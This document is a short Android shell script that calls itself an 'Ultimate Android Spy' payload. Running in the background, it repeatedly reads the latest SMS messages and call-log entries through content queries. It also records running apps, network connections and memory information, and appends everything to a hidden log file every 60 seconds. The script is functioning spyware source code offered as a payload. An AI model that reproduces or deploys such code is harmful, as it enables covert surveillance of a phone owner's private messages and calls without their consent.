#!/system/bin/sh

# Ultimate Android Spy - Shell Script Payload
# This runs in background and collects data

LOG_FILE="/data/local/tmp/spy_log.txt"
PID_FILE="/data/local/tmp/spy.pid"

# Save PID
echo $$ > "$PID_FILE"

log() {
    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$TIMESTAMP] $1" | tee -a "$LOG_FILE"
}

log "=========================================="
log "=== SPY PAYLOAD STARTED ==="
log "=========================================="
log "PID: $$"
log "User: $(whoami)"
log "Device: $(getprop ro.product.model)"
log "Android: $(getprop ro.build.version.release)"
log "=========================================="

# Main monitoring loop
CYCLE=0

while true; do
    CYCLE=$((CYCLE + 1))
    
    log ""
    log "--- Cycle #$CYCLE ---"
    
    # Try to read SMS via content command
    log "[SMS] Attempting to read..."
    content query --uri content://sms/inbox --projection address:body:date --sort 'date DESC' --limit 3 2>&1 | head -10 | tee -a "$LOG_FILE"
    
    # Try to read call logs
    log "[CALLS] Attempting to read..."
    content query --uri content://call_log/calls --projection number:type:date:duration --sort 'date DESC' --limit 3 2>&1 | head -10 | tee -a "$LOG_FILE"
    
    # Process list (always works)
    log "[PROCESSES] Running apps:"
    ps -A | grep "com\." | head -10 | tee -a "$LOG_FILE"
    
    # Network connections (always works)
    log "[NETWORK] Active connections:"
    cat /proc/net/tcp | head -5 | tee -a "$LOG_FILE"
    
    # System info (always works)
    log "[SYSTEM] Memory:"
    cat /proc/meminfo | head -3 | tee -a "$LOG_FILE"
    
    log "--- Cycle #$CYCLE complete ---"
    log "Sleeping 60 seconds..."
    
    sleep 60
done

